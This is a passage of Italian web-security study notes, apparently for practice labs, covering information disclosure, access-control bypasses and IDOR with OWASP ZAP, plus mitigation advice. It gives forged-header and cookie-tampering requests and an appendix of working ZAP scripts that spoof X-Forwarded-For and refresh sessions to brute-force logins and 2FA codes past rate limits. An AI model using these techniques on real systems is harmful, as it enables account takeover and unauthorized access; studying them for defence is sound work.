L'errata configurazione dei server web o l'abilitazione di metodi HTTP diagnostici può rivelare l'architettura interna.
*   **Il Metodo TRACE:** Progettato per il debugging, il metodo `TRACE` fa in modo che il server web restituisca al client l'esatta richiesta HTTP ricevuta.
*   **Leak di Header Interni:** Inviando una richiesta `TRACE /admin`, la risposta del server mostrerà se eventuali reverse proxy hanno aggiunto header nascosti (es. `X-Custom-IP-Authorization: <IP-reale>`). Questo header viene usato dal backend per verificare se la richiesta proviene da una rete locale autorizzata.
*   **Exploitation tramite ZAP Replacer:** Scoperto l'header, si può utilizzare la funzionalità **Replacer** di ZAP (equivalente a Match and Replace) per intercettare automaticamente ogni richiesta in uscita e iniettare l'header contraffatto:
```http
X-Custom-IP-Authorization: 127.0.0.1
```
Ciò inganna il controllo degli accessi, permettendo all'attaccante di visualizzare pannelli di amministrazione esposti.

#### 6.6 Mitigazione e Prevenzione
La prevenzione delle vulnerabilità di Information Disclosure richiede un approccio a più livelli:
1.  **Error Handling Generico:** Mostrare sempre messaggi di errore standard in produzione. Mai rivelare stack trace o nomi di tabelle/colonne del DB.
2.  **Hardening del Server Web:** Disabilitare la visualizzazione del contenuto delle directory (Directory Listing) e i metodi HTTP inutilizzati (come `TRACE` o `OPTIONS`).
3.  **Sanitizzazione in Build:** Integrare processi automatizzati di CI/CD per rimuovere commenti degli sviluppatori, mappare correttamente le cartelle ed evitare il deploy di directory di versioning (es. `.git`, `.svn`) o file temporanei.

---

### 7. Access Control & Privilege Escalation
Il controllo degli accessi (Access Control) impone vincoli su chi o cosa è autorizzato a eseguire azioni o accedere a risorse. Le vulnerabilità in questo ambito si verificano quando un utente può accedere a risorse o eseguire azioni non consentite dal suo livello di autorizzazione.

Queste vulnerabilità si dividono principalmente in due categorie:
*   **Vertical Privilege Escalation:** Un utente base ottiene l'accesso a funzionalità riservate a utenti con privilegi superiori (es. permessi di amministratore).
*   **Horizontal Privilege Escalation:** Un utente ottiene l'accesso a risorse appartenenti a un altro utente con lo stesso livello di privilegi (es. visualizzare il conto bancario di un'altra persona).

#### 7.1 Vertical Privilege Escalation
**1. Funzionalità Amministrative Non Protette** 
Spesso le pagine di amministrazione non implementano veri controlli di sessione, ma si basano sull'offuscamento ("security by obscurity"). L'attaccante può scoprire questi endpoint nascosti in vari modi:
*   Ispezionando il file `/robots.txt` (es. `Disallow: /administrator-panel`).
*   Analizzando il codice sorgente della pagina o i file JavaScript. Spesso, il codice front-end contiene riferimenti agli URL amministrativi (es. `var adminUrl = '/admin-panel-xyz'`) anche se il pulsante per accedervi è nascosto lato UI.

**2. Controlli Basati su Parametri Modificabili** 
Alcune applicazioni memorizzano il ruolo dell'utente in posizioni controllabili dal client (cookie, campi nascosti, parametri JSON). Tramite lo **ZAP Proxy** o il **Requester**, è possibile intercettare e manipolare questi valori:
```http
# Modifica del ruolo tramite Cookie
Cookie: session=xyz; Admin=true

# Modifica del ruolo tramite JSON Body (Aggiornamento profilo)
{"email":"test@test.com", "roleid":2}
```

#### 7.2 Bypass a livello di Piattaforma (Misconfigurations)
Alcuni framework applicano restrizioni basate esclusivamente sul percorso dell'URL o sul Metodo HTTP.

**1. URL-Matching Discrepancies e Override** 
Se un WAF (Web Application Firewall) o un reverse proxy blocca l'accesso diretto a `/admin`, il backend potrebbe comunque elaborare header non standard che sovrascrivono l'URL originale. 
In ZAP, si può tentare di accedere alla root `/` iniettando l'header `X-Original-URL`:
```http
POST / HTTP/1.1
X-Original-URL: /admin/delete?username=carlos
```

**2. Circonvenzione del Metodo HTTP** 
Se le regole di autorizzazione sono strettamente legate al metodo (es. `DENY POST /admin`), l'applicazione potrebbe tollerare metodi alternativi. Intercettando la richiesta con ZAP, è possibile cambiare il metodo da `POST` a `GET` (passando i parametri nella query string) per aggirare il blocco della piattaforma.

#### 7.3 Insecure Direct Object References (IDOR)
Le vulnerabilità IDOR si verificano quando un'applicazione usa l'input dell'utente per accedere direttamente a oggetti o file sul server.

**1. IDOR su Parametri Prevedibili** 
Se una pagina carica i dati dell'utente tramite un parametro sequenziale (es. `?id=123`), basta iterare il valore (es. `?id=124`) tramite lo **ZAP Fuzzer** per accedere agli account di altre vittime (Horizontal Escalation). Se la vittima colpita è un amministratore e la pagina rivela la sua password o la sua API Key, l'attacco si trasforma in Vertical Escalation.

**2. IDOR su Identificatori Imprevedibili (GUID)** 
Se l'applicazione usa GUID complessi, il guessing diretto è impossibile. Tuttavia, il GUID della vittima potrebbe essere "leaked" (trapelato) altrove nell'applicazione, ad esempio nei link degli autori dei post sul blog o nei commenti. Una volta recuperato, lo si inserisce nel parametro vulnerabile.

**3. Data Leakage nei Redirect** 
Un'applicazione potrebbe rilevare l'accesso non autorizzato e rispondere con un `302 Redirect` verso la pagina di login. Tuttavia, se il codice lato server non interrompe immediatamente l'esecuzione (`die()` o `return`), il **body della risposta HTTP** potrebbe comunque contenere i dati sensibili dell'utente richiesto prima che il browser effettui il reindirizzamento. ZAP permette di ispezionare il raw body ignorando i redirect automatici.

**4. IDOR su File Statici** 
Le risorse statiche, come i log o le trascrizioni delle chat, potrebbero essere salvate con nomi sequenziali.
```http
# Navigando a ritroso nell'indice dei log si possono trovare file di altri utenti
GET /static/1.txt HTTP/1.1
```

#### 7.4 Vulnerabilità in Processi Multi-Step
Molte funzioni sensibili richiedono passaggi multipli (es. *Modifica Ruolo -> Conferma Modifica*). 
Se l'applicazione controlla i permessi solo sul primo step, un attaccante (con account base) può utilizzare ZAP per forgiare direttamente la richiesta finale (es. la `POST` di conferma dello Step 2), fornendo i parametri necessari e scavalcando del tutto il controllo autorizzativo iniziale.

#### 7.5 Referer-Based Access Control
Se l'applicazione verifica i privilegi per le sotto-pagine basandosi sull'intestazione HTTP `Referer` (es. garantendo l'accesso se la richiesta proviene apparentemente dalla dashboard di amministrazione), l'attaccante può bypassare il blocco semplicemente forgiando l'header nella sua richiesta:
```http
GET /admin-roles?username=carlos&action=upgrade HTTP/1.1
Referer: [https://target.com/admin](https://target.com/admin)
```

#### 7.6 Prevenzione e Mitigazione
*   Non fare mai affidamento sull'offuscamento o sui controlli lato client (inclusi i Cookie o i parametri).
*   Il controllo degli accessi deve essere applicato **server-side**, verificando i privilegi dell'utente associato al token di sessione (JWT o Session ID) a ogni singola richiesta.
*   Negare l'accesso di default (*Deny by Default*): l'accesso a qualsiasi risorsa deve essere esplicitamente autorizzato.
*   Nelle query al database, includere sempre l'ID dell'utente loggato per garantire che stia richiedendo un record di sua proprietà (es. `SELECT * FROM data WHERE id = ? AND user_id = ?`).

---

*(Le sezioni da 8 a 14 sono in fase di stesura...)*

---

## Parte 2: Client-Side Vulnerabilities
Le vulnerabilità client-side colpiscono gli utenti dell'applicazione, sfruttando il trust del browser o manipolando la DOM e le risorse condivise.

*(Le sezioni da 15 a 20 sono in fase di stesura...)*

---

## Parte 3: Advanced Topics
Vulnerabilità architetturali complesse che richiedono una profonda comprensione dei protocolli, della serializzazione dei dati e delle moderne architetture web.

*(Le sezioni da 21 a 31 sono in fase di stesura...)*

---

## Appendice: OWASP ZAP Automation Scripts

### Authentication Scripts

#### Bypass Rate Limit: IP Spoofing (X-Forwarded-For)
```javascript
// Dichiariamo il contatore globale
var contatore = 1;

function sendingRequest(msg, initiator, helper) {
    if (initiator === 4 || initiator === 8) { 
        try {
            var fakeIp = "10.0.0." + contatore;
            msg.getRequestHeader().setHeader("X-Forwarded-For", fakeIp);
            print("Richiesta in partenza... Spoofed IP: " + fakeIp);
            
            contatore++;
            if (contatore > 254) {
                contatore = 1; 
            }
        } catch (e) {
            print("Errore nello script: " + e);
        }
    }
}
function responseReceived(msg, initiator, helper) {}
```

#### Bypass Rate Limit: Reset Contatore via Valid Login
```javascript
var HttpMessage = Java.type("org.parosproxy.paros.network.HttpMessage");
var HttpSender = Java.type("org.parosproxy.paros.network.HttpSender");
var contatore = 1;

function sendingRequest(msg, initiator, helper) {
    if (initiator === 4 || initiator === 8) { 
        try {
            if (contatore % 2 === 0) {
                print("--- Eseguo login valido per reset blocco IP ---");
                var sender = new HttpSender(15);
                var msgValidLogin = msg.cloneRequest();
                
                // INSERISCI QUI LE CREDENZIALI VALIDE DELL'ATTACCANTE
                var validBody = "username=wiener&password=peter";
                msgValidLogin.getRequestBody().setBody(validBody);
                msgValidLogin.getRequestHeader().setContentLength(msgValidLogin.getRequestBody().length());
                sender.sendAndReceive(msgValidLogin, false);
                
                print("Login di reset inviato! Status: " + msgValidLogin.getResponseHeader().getStatusCode());
                contatore++; 
            }
            print("Invio payload fuzzer numero: " + contatore);
            contatore++;
        } catch (e) {
            print("!!! Errore nello script !!! -> " + e);
        }
    }
}
function responseReceived(msg, initiator, helper) {}
```

#### Bypass 2FA: CSRF Refresh automatico
Ri-autentica l'utente e cattura i nuovi cookie e token CSRF al volo, applicandoli alle richieste del Fuzzer per aggirare il blocco dopo tentativi falliti multipli.

```javascript
var HttpMessage = Java.type("org.parosproxy.paros.network.HttpMessage");
var URI = Java.type("org.apache.commons.httpclient.URI");
var Pattern = Java.type("java.util.regex.Pattern");
var HttpSender = Java.type("org.parosproxy.paros.network.HttpSender");

var contatoreTentativi = 0;
var cookieAttivo = "";
var csrfAttivo = "";

function estraiConJava(regexStringa, testo) {
    var pattern = Pattern.compile(regexStringa);
    var matcher = pattern.matcher(testo);
    if (matcher.find()) {
        return matcher.group(1);
    }
    return null;
}

function sendingRequest(msg, initiator, helper) {
    if (initiator === 4 || initiator === 8) {
        try {
            var baseUrl = "https://INSERISCI_QUI_URL_DEL_TARGET";
            
            if (contatoreTentativi === 0) {
                print("--- ESEGUO LOGIN DI RESET PER RECUPERO CSRF ---");
                var sender = new HttpSender(15);

                var msgGetLogin = msg.cloneRequest();
                msgGetLogin.getRequestHeader().setURI(new URI(baseUrl + "/login", true));
                msgGetLogin.getRequestHeader().setMethod("GET");
                msgGetLogin.getRequestBody().setBody("");
                msgGetLogin.getRequestHeader().setContentLength(0);
                sender.sendAndReceive(msgGetLogin, true); 
                
                var csrf1 = estraiConJava('name="csrf" value="([^"]+)"', msgGetLogin.getResponseBody().toString()) || "";
                var session1 = estraiConJava("(session=[a-zA-Z0-9]+)", msgGetLogin.getResponseHeader().toString()) || "";

                var msgPostLogin = msg.cloneRequest();
                msgPostLogin.getRequestHeader().setURI(new URI(baseUrl + "/login", true));
                msgPostLogin.getRequestHeader().setMethod("POST");
                msgPostLogin.getRequestHeader().setHeader("Content-Type", "application/x-www-form-urlencoded");
                if (session1) msgPostLogin.getRequestHeader().setHeader("Cookie", session1);
                
                msgPostLogin.getRequestBody().setBody("csrf=" + csrf1 + "&username=carlos&password=montoya");
                msgPostLogin.getRequestHeader().setContentLength(msgPostLogin.getRequestBody().length());
                sender.sendAndReceive(msgPostLogin, false); 

                var headersPost = msgPostLogin.getResponseHeader().toString();
                var session2 = estraiConJava("(session=[a-zA-Z0-9]+)", headersPost);
                var verify = estraiConJava("(verify=[a-zA-Z0-9]+)", headersPost);
                
                cookieAttivo = "";
                if (session2) cookieAttivo += session2 + "; ";
                else cookieAttivo += session1 + "; ";
                if (verify) cookieAttivo += verify;

                var msgGetLogin2 = msg.cloneRequest();
                msgGetLogin2.getRequestHeader().setURI(new URI(baseUrl + "/login2", true));
                msgGetLogin2.getRequestHeader().setMethod("GET");
                msgGetLogin2.getRequestBody().setBody("");
                msgGetLogin2.getRequestHeader().setContentLength(0);
                msgGetLogin2.getRequestHeader().setHeader("Cookie", cookieAttivo);
                sender.sendAndReceive(msgGetLogin2, true);

                csrfAttivo = estraiConJava('name="csrf" value="([^"]+)"', msgGetLogin2.getResponseBody().toString()) || "";
            }

            msg.getRequestHeader().setHeader("Cookie", cookieAttivo);
            var fuzzerBody = msg.getRequestBody().toString();
            fuzzerBody = fuzzerBody.replace(/csrf=[^&]+/, "csrf=" + csrfAttivo);
            msg.getRequestBody().setBody(fuzzerBody);
            msg.getRequestHeader().setContentLength(msg.getRequestBody().length());
            
            contatoreTentativi++;
            if (contatoreTentativi >= 2) {
                contatoreTentativi = 0;
            }

        } catch (e) {
            print("!!! ERRORE DELLO SCRIPT !!! -> " + e);
        }
    }
}

function responseReceived(msg, initiator, helper) {}
```
